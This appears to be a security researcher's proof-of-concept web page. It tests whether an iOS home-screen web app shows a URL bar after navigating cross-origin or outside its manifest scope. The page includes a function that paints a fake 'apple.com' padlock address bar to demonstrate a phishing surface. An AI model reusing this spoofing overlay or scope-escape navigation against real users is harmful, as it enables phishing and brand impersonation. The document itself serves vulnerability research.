@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<meta name="apple-mobile-web-app-title" content="Wallet">
+<link rel="manifest" href="manifest.json">
+<title>PoC R4 - PWA Scope Escape</title>
+<style>
+  body{font-family:-apple-system,Helvetica,Arial,sans-serif;margin:0;padding:12px;background:#f2f2f7;color:#111}
+  h1{font-size:17px;margin:0 0 2px}
+  h2{font-size:14px;margin:16px 0 6px;border-top:1px solid #ddd;padding-top:10px}
+  .sub{font-size:12px;color:#666;margin:0 0 8px}
+  input{width:100%;box-sizing:border-box;padding:8px;font-size:13px;border:1px solid #ccc;border-radius:8px;margin-bottom:6px}
+  .grid{display:grid;grid-template-columns:1fr 1fr;gap:7px}
+  button{padding:12px 6px;font-size:12px;border:none;border-radius:8px;background:#007aff;color:#fff}
+  button.big{grid-column:1/3}
+  #log{background:#000;color:#0f0;font-family:ui-monospace,Menlo,monospace;font-size:11px;padding:8px;border-radius:8px;height:170px;overflow:auto;white-space:pre-wrap;margin-top:10px}
+  #banner{padding:10px;border-radius:8px;text-align:center;font-weight:700;margin-bottom:8px}
+  .stand{background:#34c759;color:#fff}.tab{background:#8e8e93;color:#fff}
+</style>
+</head>
+<body>
+<div id="banner" class="tab">checking display mode…</div>
+<h1>Round 4 — PWA Scope Escape</h1>
+<p class="sub">Add this page to the Home Screen (Share → Add to Home Screen), then OPEN IT FROM THE ICON so it runs standalone (no URL bar). The oracle: when you navigate cross-origin or outside manifest scope, does iOS show ANY URL bar / origin banner? If not → chrome-less phishing surface.</p>
+
+<h2>1 · Navigate cross-origin (does a URL bar appear?)</h2>
+<input id="url" value="https://example.com/">
+<div class="grid">
+  <button onclick="go('assign')">location.href</button>
+  <button onclick="go('replace')">location.replace</button>
+  <button onclick="go('link')">anchor click</button>
+  <button onclick="go('open')">window.open</button>
+  <button onclick="go('meta')">meta refresh</button>
+  <button onclick="go('form')">form submit</button>
+</div>
+
+<h2>2 · Navigate OUTSIDE manifest scope (same origin)</h2>
+<p class="sub">Manifest scope is /poc/r4/. This goes to /poc/ (out of scope). Does chrome appear?</p>
+<button class="big" onclick="location.href='../'">Go to ../ (out of scope)</button>
+
+<h2>3 · Chrome-less spoof demo</h2>
+<p class="sub">In standalone mode there is no real URL bar, so a page can draw a FAKE one. This paints a fake "apple.com 🔒" bar to show the impersonation risk.</p>
+<button class="big" onclick="fakeChrome()">Paint fake apple.com URL bar</button>
+
+<div id="log"></div>
+<button class="big" style="margin-top:8px" onclick="navigator.clipboard.writeText(document.getElementById('log').textContent)">Copy log</button>
+
+<script>
+const logEl=document.getElementById('log');
+const ts=()=>new Date().toISOString().substr(11,12);
+const log=m=>{logEl.textContent+=`[${ts()}] ${m}\n`;logEl.scrollTop=logEl.scrollHeight};
+const U=()=>document.getElementById('url').value;
+
+const standalone=(navigator.standalone===true)||matchMedia('(display-mode:standalone)').matches;
+const b=document.getElementById('banner');
+if(standalone){b.className='stand';b.textContent='STANDALONE (no URL bar) — good, test now';}
+else{b.className='tab';b.textContent='IN SAFARI TAB — add to Home Screen & open from icon';}
+log('display-mode standalone = '+standalone);
+log('navigator.standalone = '+navigator.standalone);
+
+function go(how){
+  const u=U();log(`navigate [${how}] -> ${u} — did a URL bar / banner appear?`);
+  switch(how){
+    case 'assign':location.href=u;break;
+    case 'replace':location.replace(u);break;
+    case 'link':{const a=document.createElement('a');a.href=u;document.body.appendChild(a);a.click();break;}
+    case 'open':{const w=window.open(u,'_blank');log('  window.open returned '+(w?'handle':'null'));break;}
+    case 'meta':{const m=document.createElement('meta');m.httpEquiv='refresh';m.content='0;url='+u;document.head.appendChild(m);break;}
+    case 'form':{const f=document.createElement('form');f.action=u;f.method='GET';document.body.appendChild(f);f.submit();break;}
+  }
+}
+function fakeChrome(){
+  document.body.insertAdjacentHTML('afterbegin',
+    '<div style="position:fixed;top:0;left:0;right:0;background:#f2f2f7;border-bottom:1px solid #ccc;padding:calc(env(safe-area-inset-top) + 6px) 8px 8px;z-index:9999;text-align:center;font:600 13px -apple-system">🔒 apple.com</div>');
+  log('painted fake URL bar. In standalone mode there is no real bar to contradict it.');
+}
+</script>
+</body>
+</html>
